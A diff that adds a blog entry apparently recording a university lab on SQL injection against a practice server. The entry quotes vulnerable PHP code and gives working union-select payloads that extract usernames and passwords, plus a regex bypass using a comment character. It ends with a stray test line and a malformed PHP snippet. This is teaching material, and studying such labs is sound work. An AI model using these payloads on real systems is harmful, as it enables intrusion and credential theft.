@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>study</title>
+      <link href="/2024/04/09/study/"/>
+      <url>/2024/04/09/study/</url>
+      
+        <content type="html"><![CDATA[<p>sql 注入实验二<br>实验简介<br>实验所属系列：WEB应用安全<br>实验对象： 本科/专科信息安全专业<br>相关课程及专业：信息网络安全概论<br>实验时数（学分）：2学时<br>实验类别：实践实验类<br>实验目的<br>1、深入理解sql注入工作原理；<br>2、怎么去绕过正则表达式实现注入<br>3、培养学生的独立思考能力<br>预备知识<br>给出如下参考链接（你亦可自己到网上去找相关内容学习）： <a href="http://www.2cto.com/Article/201208/151503.html">http://www.2cto.com/Article/201208/151503.html</a><br>实验环境<br>浏览器/服务器环境；<br>服务器配置：apache+php+Mysql；<br>打开实验网址（<a href="http://10.1.1.11:81)，可以看到实验练习系统">http://10.1.1.11:81)，可以看到实验练习系统</a><br>实验步骤一<br>实例四、看仔细点，别被吓坏了<br>      关键代码：<br>      <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">      $sql=&quot;SELECT * FROM users where id=&quot;;</span><br><span class="line">      $sql.=mysql_real_escape_string($_GET[&quot;id&quot;]).&quot; &quot;;</span><br><span class="line">      $result = mysql_query($sql);</span><br><span class="line"></span><br><span class="line">      本例任务：尝试进行sql注入，目标为得到数据库中的用户名与密码，并对你的sql注入测试语句及简单说明；  </span><br><span class="line">      判断输入数据是否录入数据库：</span><br><span class="line">      注入语句（一）：</span><br><span class="line">      10.1.1.11：81/sqli/example4.php?id=2 or 1 = 1</span><br><span class="line">      判断列数：</span><br><span class="line">      注入语句（二）：</span><br><span class="line">      10.1.1.11：81/sqli/example4.php?id=2 order by 5</span><br><span class="line">      知道列数后采用union和select联合查询</span><br><span class="line">      注入语句（三）：</span><br><span class="line">      10.1.1.11：81/sqli/example4.php?id=2 union select 1,2,3,4,5 from users</span><br><span class="line">      尝试提取 name 和 password ：</span><br><span class="line">      注入语句（四）：</span><br><span class="line">     10.1.1.11：81/sqli/example4.php?id=2 union select name,passwd,3,4,5 from users</span><br><span class="line">实验步骤二 </span><br><span class="line">实例五、这个规则没多大意义  </span><br><span class="line">      关键代码：  </span><br><span class="line">      </span><br><span class="line">      if(preg_match(&#x27;/^[0-9]+/&#x27;,$_GET[&quot;id&quot;])) &#123;</span><br><span class="line">      die(&quot;ERROR NO INTEGER REQUIRED&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      $sql = &quot;SELECT * FROM users where id = &#x27;&#x27;;</span><br><span class="line">      $sql .=$_GET[&quot;id&quot;];</span><br><span class="line">      $result = mysql_query（$sql）;</span><br><span class="line">      本例任务：尝试进行sql注入，目标为得到数据库中的用户名与密码，并对你的sql注入测试语句及简单说明；  </span><br><span class="line">      同步骤四。</span><br><span class="line">      查看关键代码可知，输入信息开头为数字即可，我们一开始就输入了 id=1 ，所以未报错，可以正常注入。</span><br><span class="line">实验步骤三  </span><br><span class="line">实例六、想用工具没门  </span><br><span class="line">      关键代码：  </span><br><span class="line">  if(preg_match(&#x27;/^[0-9]+$/&#x27;,$_GET[&quot;id&quot;])) &#123;</span><br><span class="line">      die(&quot;ERROR NO INTEGER REQUIRED&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      $sql = &quot;SELECT * FROM users where id = &#x27;&#x27;;</span><br><span class="line">      $sql .=$_GET[&quot;id&quot;];</span><br><span class="line">      $result = mysql_query（$sql）;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">      本例任务：尝试进行sql注入，目标为得到数据库中的用户名与密码，并对你的sql注入测试语句及简单说明；  </span><br><span class="line">    同样使用实验四的方法，此时报错： </span><br><span class="line">     10.1.1.11：81/sqli/example4.php?id=2 union select name,passwd,3,4,5 from users</span><br><span class="line">     查看关键代码，可知存在数字匹配。</span><br><span class="line">     10.1.1.11：81/sqli/example4.php?id=2 union select name,passwd,3,4,5 from users111</span><br><span class="line">     此时不报错，那我们用 %23 将数字注释：</span><br><span class="line">     10.1.1.11：81/sqli/example4.php?id=2 union select name,passwd,3,4,5 from users%23111</span><br><span class="line">实验报告总结  </span><br><span class="line">总结你是怎么去完成实验的，及在实验过程中碰到了那些问题，及这些问题你是怎么去解决的，或者是还没搞定，需要求助老师的。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php php.info() php&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> study </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>test2</title>
       <link href="/2024/03/28/test2/"/>
       <url>/2024/03/28/test2/</url>
